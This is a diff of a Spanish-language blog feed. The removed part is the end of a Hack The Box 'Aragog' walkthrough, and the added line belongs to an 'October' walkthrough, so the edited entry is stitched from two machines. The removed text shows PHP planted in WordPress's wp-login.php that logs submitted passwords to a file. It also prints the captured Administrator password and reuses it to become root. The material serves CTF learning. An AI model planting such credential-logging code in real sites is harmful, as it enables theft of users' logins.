-&lt;p&gt;Con lo que tenemos, podemos pensar que el programa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/cliff/wp-login.py&lt;/code&gt; se está autenticando el el portal de login de wordPress y como tenemos permisos para modificar los archivos encontrado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev_wiki&lt;/code&gt;, podemos obtener las crenciales de login agregando las siguientes líneas en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-login.php&lt;/code&gt; (Nota: Hay que hacerlo rápido porque tenemos que recordar que se restablecen los archivos de dicho directorio debido al script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;restore.sh&lt;/code&gt; ejecutado por el usuario &lt;strong&gt;root&lt;/strong&gt;).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;require&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__FILE__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/wp-load.php'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'datos_login.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-file_put_contents&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;, print_r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, FILE_APPEND&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Con lo anterior, se crea un archivo de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;datos_login.txt&lt;/code&gt; cuando se intenta autenticar en el panel de login de WordPress. Para ver cuando el archivo se haya creado, monitoreamos el contenido de la carpeta con:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;florian@aragog:/var/www/html/dev_wiki&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;watch &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos rápidamente el contenido del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;datos_login.txt&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;florian@aragog:/var/www/html/dev_wiki&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;datos_login.txt
-Array
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;KRgYs&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JFO!&amp;amp;MTr&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;lf
-    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wp-submit] &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; Log In
-    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;testcookie] &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 1
-    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;log] &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; Administrator
-    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;redirect_to] &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; http://127.0.0.1/dev_wiki/wp-admin/
-&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-florian@aragog:/var/www/html/dev_wiki&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y tenemos la contraseña del usuario &lt;strong&gt;Administrator&lt;/strong&gt; del portal de WordPress. Podíamos pensar que se está utilizando reutilización de contraseñas y podemos probar para el usuario &lt;strong&gt;root&lt;/strong&gt; de la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;florian@aragog:/var/www/html/dev_wiki&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su root
-Password: 
-shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
-sh: 0: getcwd&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; failed: No such file or directory
-root@aragog:/var/www/html/dev_wiki# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..
-chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
-root@aragog:..# &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;root
-root@aragog:..#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A partir de aquí ya podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><category term="XXE" /><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Aragog en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;A este punto ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><summary type="html">Resolución de la máquina October en la plataforma de Hack The Box</summary></entry></feed>
